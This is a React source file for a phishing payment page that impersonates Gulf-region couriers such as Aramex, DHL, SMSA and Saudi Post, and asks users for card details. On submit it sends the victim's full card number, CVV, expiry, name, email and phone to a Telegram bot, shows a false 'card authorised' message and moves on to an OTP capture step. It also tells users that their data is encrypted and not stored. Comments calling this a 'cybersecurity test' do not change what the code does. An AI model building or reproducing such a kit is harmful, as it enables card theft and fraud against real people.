import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  
  // Get customer info from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
  const branding = getServiceBranding(serviceName);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
  };
  
  const heroImage = heroImages[serviceName.toLowerCase()] || heroBg;
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiry || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Store complete card info for cybersecurity test
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: cardName,
          cardLast4: last4,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send complete card details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'card_details',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        cardholder: cardName,
        cardNumber: cardNumber, // Full card number for cybersecurity test
        cardLast4: last4,
        expiry: expiry,
        cvv: cvv, // CVV for cybersecurity test
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Card details sent to Telegram successfully');
    } else {
      console.error('Failed to send card details to Telegram:', telegramResult.error);
    }
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        amount={formattedAmount}
        title={`بيانات البطاقة - ${serviceName}`}
        description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      />
      <div 
        className="min-h-screen bg-background"
        dir="rtl"
      >
        {/* Hero Section */}
      <div className="relative w-full h-48 sm:h-64 overflow-hidden">
        <img 
          src={heroImage}
          alt={serviceName}
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
        
        {/* Logo Overlay */}
        <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
          {branding.logo && (
            <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-12 sm:h-16 w-auto"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
        </div>
        
        {/* Title Overlay */}
        <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
          <div className="text-right">
            <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
            <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
          </div>
        </div>
      </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
            <div className="flex items-center justify-between mb-6 sm:mb-8">
              <h1 className="text-xl sm:text-3xl font-bold">بيانات البطاقة</h1>
              
              <div
                className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                }}
              >
                <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
              </div>
            </div>

            {/* Security Notice */}
            <div 
              className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
              style={{
                background: `${branding.colors.primary}10`,
                border: `1px solid ${branding.colors.primary}30`
              }}
            >
              <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
              <p className="text-xs sm:text-sm">
                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
              </p>
            </div>

            {/* Visual Card Display */}
            <div 
              className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                minHeight: '180px'
              }}
            >
              <div className="absolute top-4 right-4">
                <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
              </div>
              
              {/* Card Number Display */}
              <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
                <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
                  <span>••••</span>
                  <span>••••</span>
                  <span>••••</span>
                  <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
                </div>
              </div>

              <div className="flex justify-between items-end text-white">
                <div>
                  <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
                  <p className="text-base sm:text-lg font-mono">{expiry || "MM/YY"}</p>
                </div>
                <div className="text-right">
                  <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
                  <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
                </div>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
              {/* Cardholder Name */}
              <div>
                <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-12 sm:h-14 text-base sm:text-lg"
                  required
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-2 text-sm sm:text-base">رقم البطاقة</Label>
                <Input
                  type="password"
                  placeholder="#### #### #### ####"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
                  }
                  inputMode="numeric"
                  className="h-12 sm:h-14 text-base sm:text-lg tracking-wider"
                  required
                />
              </div>
              
              {/* CVV, Year, Month Row */}
              <div className="grid grid-cols-3 gap-2 sm:gap-3">
                <div>
                  <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
                  <Input
                    type="password"
                    placeholder="***"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    inputMode="numeric"
                    className="h-12 sm:h-14 text-base sm:text-lg text-center"
                    required
                  />
                </div>
                
                <div>
                  <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
                  <Select
                    value={expiry.split('/')[1] || ''}
                    onValueChange={(year) => {
                      const month = expiry.split('/')[0] || '';
                      setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
                    }}
                  >
                    <SelectTrigger className="h-12 sm:h-14">
                      <SelectValue placeholder="YY" />
                    </SelectTrigger>
                    <SelectContent className="z-50">
                      {Array.from({ length: 15 }, (_, i) => {
                        const year = (new Date().getFullYear() + i).toString().slice(-2);
                        return (
                          <SelectItem key={year} value={year}>
                            {year}
                          </SelectItem>
                        );
                      })}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
                  <Select
                    value={expiry.split('/')[0] || ''}
                    onValueChange={(month) => {
                      const year = expiry.split('/')[1] || '';
                      setExpiry(month && year ? `${month}/${year}` : month);
                    }}
                  >
                    <SelectTrigger className="h-12 sm:h-14">
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent className="z-50">
                      {Array.from({ length: 12 }, (_, i) => {
                        const month = (i + 1).toString().padStart(2, '0');
                        return (
                          <SelectItem key={month} value={month}>
                            {month}
                          </SelectItem>
                        );
                      })}
                    </SelectContent>
                  </Select>
                </div>
              </div>
              
              {/* Submit Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <span className="ml-2">تفويض البطاقة</span>
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
              </Button>
              
              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                بالمتابعة، أنت توافق على الشروط والأحكام
              </p>
            </form>
          
            {/* Hidden Netlify Form */}
            <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
              <input type="text" name="name" />
              <input type="email" name="email" />
              <input type="tel" name="phone" />
              <input type="text" name="service" />
              <input type="text" name="amount" />
              <input type="text" name="cardholder" />
              <input type="text" name="cardLast4" />
              <input type="text" name="expiry" />
              <input type="text" name="timestamp" />
            </form>
          </Card>
        </div>
      </div>
    </>
  );
};

export default PaymentCardForm;
